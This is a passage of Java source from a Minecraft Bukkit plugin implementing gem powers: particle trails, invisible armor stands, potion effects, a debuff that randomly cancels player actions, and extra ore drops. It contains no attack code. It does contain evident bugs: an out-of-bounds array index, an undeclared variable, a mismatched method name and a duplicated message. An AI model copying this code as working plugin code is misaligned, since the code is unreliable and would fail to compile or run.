                    Location RightSmokeLocation = eyeLocation.clone().add(RightDirection);

                    player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, frontSmokeLocation, 0);
                    player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, LeftSmokeLocation, 0);
                    player.getWorld().spawnParticle(Particle.SMOKE_NORMAL, RightSmokeLocation, 0);
                }
            }
        };
        particleTask.runTaskTimer(this, 0L, 1L); // Schedules the task to run every second (20 ticks)

        new BukkitRunnable() {
            @Override
            public void run() {
                stopSummoningSmoke();
            }
        }.runTaskLater(this, 800L);
    }

    public void stopSummoningSmoke() {
        if (particleTask != null && !particleTask.isCancelled()) {
            particleTask.cancel();
            getLogger().info("Particle task cancelled");
        }
    }


    public void Daggers() {
        teleportTask = new BukkitRunnable() {
            @Override
            public void run() {
                for (Player player : Bukkit.getOnlinePlayers()) {
                    UUID playerId = player.getUniqueId();

                    ArmorStand[] stands = armorStands.computeIfAbsent(playerId, id -> {
                        ArmorStand frontStand = spawnArmorStand(player);
                        ArmorStand leftStand = spawnArmorStand(player);
                        ArmorStand rightStand = spawnArmorStand(player);
                        ArmorStand backupstand = spawnArmorStand(player);
                        ArmorStand backupstand2 = spawnArmorStand(player);
                        ArmorStand backstand = spawnArmorStand(player);
                        return new ArmorStand[]{frontStand, leftStand, rightStand, backstand, backupstand, backupstand2};
                    });
                    teleportArmorStand(stands[0], player, 1.8, 0);
                    teleportArmorStand(stands[1], player, 1.8, Math.PI / 3);
                    teleportArmorStand(stands[2], player, 1.8, -Math.PI / 3);
                    teleportArmorStand(stands[4], player, 2, Math.PI / 1.8);
                    teleportArmorStand(stands[5], player, 2, -Math.PI / 1.8);
                    teleportArmorStand(stands[6], player, -999999999, -Math.PI / 3);
                }
            }
        };
        teleportTask.runTaskTimer(this, 0L, 1L); // Schedules the task to run every tick (1 tick)
    }

    private ArmorStand spawnArmorStand(Player player) {
        Location eyeLocation = player.getEyeLocation();
        ArmorStand armorStand = (ArmorStand) player.getWorld().spawnEntity(eyeLocation, EntityType.ARMOR_STAND);
        armorStand.setVisible(false);
        armorStand.setGravity(false);
        armorStand.setMarker(true);
        ItemStack nautilusShell = new ItemStack(Material.NAUTILUS_SHELL);
        ItemMeta meta = nautilusShell.getItemMeta();
        if (meta != null) {
            meta.setCustomModelData(230);
            nautilusShell.setItemMeta(meta);
        }
        armorStand.getEquipment().setHelmet(nautilusShell);
        return armorStand;
    }

    private void teleportArmorStand(ArmorStand armorStand, Player player, double distance, double angleOffset) {
        Location eyeLocation = player.getEyeLocation();
        Vector direction = eyeLocation.getDirection().normalize();
        direction = direction.rotateAroundY(angleOffset);
        Location teleportLocation = eyeLocation.clone().add(direction.multiply(distance)).subtract(0, 2, 0); // Adjust height
        armorStand.teleport(teleportLocation);
    }

    private int StrengthGemCustomModelData(int CustomModelData) {
        switch (CustomModelData) {
            case 10:
                return 5;
            case 30:
                return 4;
            case 50:
                return 3;
            case 70:
                return 2;
            case 90:
                return 1;
            default:
                return 0;
        }
    }

    private int SpeedGemCustomModelData(int CustomModelData) {
        switch (CustomModelData) {
            case 8:
                return 5;
            case 28:
                return 4;
            case 48:
                return 3;
            case 68:
                return 2;
            case 88:
                return 1;
            default:
                return 0;
        }
    }

    private int LifeGemCustomModelData(int CustomModelData) {
        switch (CustomModelData) {
            case 4:
                return 5;
            case 24:
                return 4;
            case 44:
                return 3;
            case 64:
                return 2;
            case 84:
                return 1;
            default:
                return 0;
        }
    }

    private int WealthGemCustomModelData(int CustomModelData) {
        switch (CustomModelData) {
            case 12:
                return 2;
            case 32:
                return 2;
            case 52:
                return 2;
            case 72:
                return 2;
            case 92:
                return 2;
            default:
                return 0;
        }
    }

    private int PuffGemCustomModelData(int CustomModelData) {
        switch (CustomModelData) {
            case 6:
                return 5;
            case 26:
                return 4;
            case 46:
                return 3;
            case 66:
                return 2;
            case 86:
                return 1;
            default:
                return 0;
        }
    }

    private int FluxGemCustomModelData(int CustomModelData) {
        switch (CustomModelData) {
            case 8:
                return 5;
            case 18:
                return 5;
            case 28:
                return 5;
            case 38:
                return 5;
            case 48:
                return 5;
            default:
                return 0;
        }
    }

    private void StrengthCircleRadius(Player player, int radius) {
        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(241, 3, 3)) + "\uD83E\uDD3AFrailer " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill" + ChatColor.GRAY + " (radius " + radius + ")");
    }

    private void SpeedCircleRadius(Player player, int radius) {
        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(254, 253, 23)) + "\uD83C\uDFAFSloth's Sedative " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill" + ChatColor.GRAY + " (radius " + radius + ")");
    }

    private void LifeCircleRadius(Player player, int radius) {
        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(254, 4, 180)) + "\uD83D\uDC98Heart Drainer " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill" + ChatColor.GRAY + " (radius " + radius + ")");
    }

    private void WealthCircleRadius(Player player, int radius) {
        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(14, 201, 18)) + "\uD83C\uDF40Unfortunate " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill" + ChatColor.GRAY + " (radius " + radius + ")");
    }

    private void PuffCircleRadius(Player player, int radius) {
        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "☁Breezy Bash " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill" + ChatColor.GRAY + " (radius " + radius + ")");
    }

    private void FluxCircleRadius(Player player, int radius) {
        player.sendMessage(net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "\uD83D\uDD2E " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "You have activated group " + net.md_5.bungee.api.ChatColor.of(new Color(249, 249, 249)) + "☁Breezy Bash " + net.md_5.bungee.api.ChatColor.of(new Color(164, 254, 241)) + "skill" + ChatColor.GRAY + " (radius " + radius + ")");
    }


    private void Tier1ApplyEffects(Player player, int slot) {
        ItemStack item = player.getInventory().getItem(slot);
        Tier1ApplyEffects(player, item);
    }

    private void Tier2ApplyEffects(Player player, int slot) {
        ItemStack item = player.getInventory().getItem(slot);
        Tier2ApplyEffects(player, item);
    }

    private void Tier1ApplyEffects(Player player, ItemStack item) {
        if (item != null && item.getType() == Material.AMETHYST_SHARD) {
            ItemMeta meta = item.getItemMeta();
            if (meta != null && meta.hasCustomModelData()) {
                int Tier1CustomModelData = meta.getCustomModelData();
                PotionEffect[] effects = Tier1CustomModelDataEffects.get(Tier1CustomModelData);
                if (effects != null) {
                    for (PotionEffect effect : effects) {
                        player.addPotionEffect(effect);
                    }
                }
            }
        }
    }

    private void Tier2ApplyEffects(Player player, ItemStack item) {
        if (item != null && item.getType() == Material.PRISMARINE_SHARD) {
            ItemMeta meta = item.getItemMeta();
            if (meta != null && meta.hasCustomModelData()) {
                int Tier2CustomModelData = meta.getCustomModelData();
                PotionEffect[] effects = Tier2CustomModelDataEffects.get(Tier2CustomModelData);
                if (effects != null) {
                    for (PotionEffect effect : effects) {
                        player.addPotionEffect(effect);
                    }
                }
            }
        }
    }

    private class GemEffects extends BukkitRunnable {
        @Override
        public void run() {
            for (Player player : Bukkit.getOnlinePlayers()) {
                Tier2ApplyEffects(player, player.getInventory().getItemInMainHand());
                Tier2ApplyEffects(player, player.getInventory().getItemInOffHand());
                Tier1ApplyEffects(player, player.getInventory().getItemInMainHand());
                Tier1ApplyEffects(player, player.getInventory().getItemInOffHand());
            }
        }
    }

    public class ParticleLineTask extends BukkitRunnable {
        private final Player attacker;
        private final LivingEntity victim;
        private final int r; // Red component of RGB color
        private final int g; // Green component of RGB color
        private final int b; // Blue component of RGB color
        private int ticks = 0;

        public ParticleLineTask(Player attacker, LivingEntity victim, int r, int g, int b) {
            this.attacker = attacker;
            this.victim = victim;
            this.r = r;
            this.g = g;
            this.b = b;
        }

        @Override
        public void run() {
            if (victim.isDead() || ticks >= 380) { // 20 seconds * 20 ticks per second
                cancel();
                return;
            }

            Location start = attacker.getEyeLocation().clone().subtract(0, 1, 0); // Lower the start location slightly
            Location end = victim.getLocation().add(0, victim.getHeight() / 2, 0);

            Vector direction = end.toVector().subtract(start.toVector()).normalize();
            double distance = start.distance(end);
            double particleSpacing = 0.1;

            for (double d = 0; d < distance; d += particleSpacing) {
                Vector point = start.toVector().clone().add(direction.clone().multiply(d));
                attacker.getWorld().spawnParticle(Particle.REDSTONE, point.toLocation(attacker.getWorld()), 0, 0, 0, 0, 0, new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1));
                attacker.getWorld().spawnParticle(Particle.SMOKE_NORMAL, point.toLocation(attacker.getWorld()), 0, 0, 0, 0, 0);
            }

            ticks++;
        }
    }


    public class ParticleLineTaskLess extends BukkitRunnable {
        private final Player attacker;
        private final LivingEntity victim;
        private final int r; // Red component of RGB color
        private final int g; // Green component of RGB color
        private final int b; // Blue component of RGB color
        private int ticks = 0;

        public ParticleLineTaskLess(Player attacker, LivingEntity victim, int r, int g, int b) {
            this.attacker = attacker;
            this.victim = victim;
            this.r = r;
            this.g = g;
            this.b = b;
        }

        @Override
        public void run() {
            if (victim.isDead() || ticks >= 290) { // 20 seconds * 20 ticks per second
                cancel();
                return;
            }

            Location start = attacker.getEyeLocation().clone().subtract(0, 1, 0); // Lower the start location slightly
            Location end = victim.getLocation().add(0, victim.getHeight() / 2, 0);
            Vector direction = end.toVector().subtract(start.toVector()).normalize();
            double distance = start.distance(end);
            double particleSpacing = 0.1;
            for (double d = 0; d < distance; d += particleSpacing) {
                Vector point = start.toVector().clone().add(direction.clone().multiply(d));
                attacker.getWorld().spawnParticle(Particle.REDSTONE, point.toLocation(attacker.getWorld()), 0, 0, 0, 0, 0, new Particle.DustOptions(org.bukkit.Color.fromRGB(r, g, b), 1));
            }

            ticks++;
        }
    }



    @EventHandler
    public void UnfortunateBlockPlace(BlockPlaceEvent event) {
        Player player = event.getPlayer();
        if (player.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                player.getWorld().playSound(player.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    @EventHandler
    public void UnfortunateBlockBreak(BlockBreakEvent event) {
        Player player = event.getPlayer();
        if (player.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                player.getWorld().playSound(player.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    @EventHandler
    public void UnfortunateUseItem(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (player.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                player.getWorld().playSound(player.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    @EventHandler
    public void UnfortunateDamageByEntity(EntityDamageByEntityEvent event) {
        Entity attacker = event.getDamager();
        if (attacker instanceof Player && attacker.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                attacker.getWorld().playSound(attacker.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
                Player player = (Player) attacker;
                if (random.nextInt(100) < 50) { // 50% chance
                    UnfortunateHeldItem(player);
                }
            }
        }
    }

    @EventHandler
    public void UnfortunateDamageEntity(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (player.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                player.getWorld().playSound(player.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    @EventHandler
    public void UnfortunateItemConsume(PlayerItemConsumeEvent event) {
        Player player = event.getPlayer();
        if (player.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                player.getWorld().playSound(player.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    @EventHandler
    public void UnfortunateEntityDamageByEntity(EntityDamageByEntityEvent event) {
        Entity attacker = event.getDamager();
        if (attacker instanceof LivingEntity) {
            LivingEntity livingAttacker = (LivingEntity) attacker;
            if (livingAttacker.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
                if (random.nextInt(100) < 30) {
                    event.setCancelled(true);
                    livingAttacker.getWorld().playSound(livingAttacker.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);

                    if (livingAttacker instanceof Player) {
                        Player player = (Player) livingAttacker;
                        if (random.nextInt(100) < 50) { // 50% chance
                            UnfortunateHeldItem(player);
                        }
                    }
                }
            }
        }
    }


    private void UnfortunateHeldItem(Player player) {
        ItemStack heldItem = player.getInventory().getItemInMainHand();
        if (heldItem != null && !heldItem.getType().isAir()) {
            int randomSlot = random.nextInt(player.getInventory().getSize());
            ItemStack itemInRandomSlot = player.getInventory().getItem(randomSlot);
            player.getInventory().setItemInMainHand(itemInRandomSlot);
            player.getInventory().setItem(randomSlot, heldItem);
            player.updateInventory();
        }
    }

    @EventHandler
    public void UnfortunateEntityInteract(EntityInteractEvent event) {
        Entity entity = event.getEntity();
        if (entity.getPersistentDataContainer().has(UNFORTUNATE, PersistentDataType.INTEGER)) {
            if (random.nextInt(100) < 30) {
                event.setCancelled(true);
                entity.getWorld().playSound(entity.getLocation(), Sound.BLOCK_ANVIL_PLACE, 1.0f, 1.0f);
            }
        }
    }

    @EventHandler
    public void RichRush(BlockBreakEvent event) {
        Particle.DustOptions dustOptions = new Particle.DustOptions(org.bukkit.Color.fromRGB(14, 201, 18), 1);
        Player player = event.getPlayer();
        Block block = event.getBlock();
        if (player.getGameMode() == GameMode.SURVIVAL) {
            if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.DIAMOND_ORE) {
                ItemStack itemInHand = player.getInventory().getItemInMainHand();
                if (itemInHand != null && RichRushPickaxe(itemInHand.getType())) {
                    event.setDropItems(true);
                    block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.DIAMOND, 1));
                    event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
                } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.EMERALD_ORE) {
                    event.setDropItems(true);
                    block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.EMERALD, 1));
                    event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
                }
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.IRON_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.RAW_IRON, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.GOLD_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.RAW_GOLD, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.COAL_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.COAL, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.DEEPSLATE_DIAMOND_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.DIAMOND, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.DEEPSLATE_EMERALD_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.EMERALD, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.DEEPSLATE_IRON_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.RAW_IRON, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.DEEPSLATE_GOLD_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.RAW_GOLD, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.DEEPSLATE_COAL_ORE) {
                event.setDropItems(true);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.COAL, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            } else if (player.getPersistentDataContainer().has(RɪᴄʜRᴜsʜ, PersistentDataType.INTEGER) && block.getType() == Material.ANCIENT_DEBRIS) {
                event.setDropItems(false);
                block.getWorld().dropItemNaturally(block.getLocation(), new ItemStack(Material.NETHERITE_SCRAP, 1));
                event.getBlock().getWorld().spawnParticle(Particle.REDSTONE, event.getBlock().getLocation().add(0.5, 0.5, 0.5), 30, 0.5, 0.5, 0.5, dustOptions);
            }
        }
    }

    @EventHandler
    public void WealthGemHeldOffHand(BlockBreakEvent WealthGemHeldOffHand) {
        Player WealthGemOffHandPlayer = WealthGemHeldOffHand.getPlayer();
        Block block = WealthGemHeldOffHand.getBlock();
        ItemStack WealthGemItem = WealthGemOffHandPlayer.getInventory().getItemInOffHand();
        if (player.getGameMode() == GameMode.SURVIVAL) {
            if (WealthGem(WealthGemItem)) {
                if (block.getType() ==  Material.DIAMOND_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.DIAMOND, 1));
                } else if (block.getType() == Material.EMERALD_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.EMERALD, 1));
                } else if (block.getType() == Material.IRON_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.RAW_IRON, 1));
                } else if (block.getType() == Material.GOLD_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.RAW_GOLD, 1));
                } else if (block.getType() == Material.COAL_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.COAL, 1));
                } else if (block.getType() == Material.DEEPSLATE_DIAMOND_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.DIAMOND, 1));
                } else if (block.getType() == Material.DEEPSLATE_EMERALD_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.EMERALD, 1));
                } else if (block.getType() == Material.DEEPSLATE_IRON_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.RAW_IRON, 1));
                } else if (block.getType() == Material.DEEPSLATE_GOLD_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.RAW_GOLD, 1));
                } else if (block.getType() == Material.DEEPSLATE_COAL_ORE) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.COAL, 1));
                } else if (block.getType() == Material.ANCIENT_DEBRIS) {
                    WealthGemHeldOffHand.setDropItems(false);
                    WealthGemHeldOffHand.getBlock().getWorld().dropItemNaturally(WealthGemHeldOffHand.getBlock().getLocation(), new ItemStack(Material.NETHERITE_SCRAP, 1));
                }
            }
        }
    }

    @EventHandler
    public void WealthgemOffHand(BlockBreakEvent WealthGemOffHand) {
        Player WealthGemOffHandPlayer = WealthGemOffHand.getPlayer();
        ItemStack WealthGemItem = WealthGemOffHandPlayer.getInventory().getItemInOffHand();
        ItemStack PickAxeInMainHand = WealthGemOffHandPlayer.getInventory().getItemInMainHand();
        if (player.getGameMode() == GameMode.SURVIVAL) {
            if (PickAxeInMainHand != null && RichRushPickaxe(PickAxeInMainHand.getType())) {
                if (Wealthgem(WealthGemItem)) {
                    if (WealthGemOffHand.getBlock().getType() == Material.ANCIENT_DEBRIS) {
                        WealthGemOffHand.setDropItems(false);
                        WealthGemOffHand.getBlock().getWorld().dropItemNaturally(WealthGemOffHand.getBlock().getLocation(), new ItemStack(Material.NETHERITE_SCRAP, 1));
                    }
                }
            }
        }
    }


    private boolean RichRushPickaxe(Material material) {
        return material == Material.IRON_PICKAXE ||
                material == Material.DIAMOND_PICKAXE ||
                material == Material.NETHERITE_PICKAXE;
    }
}





















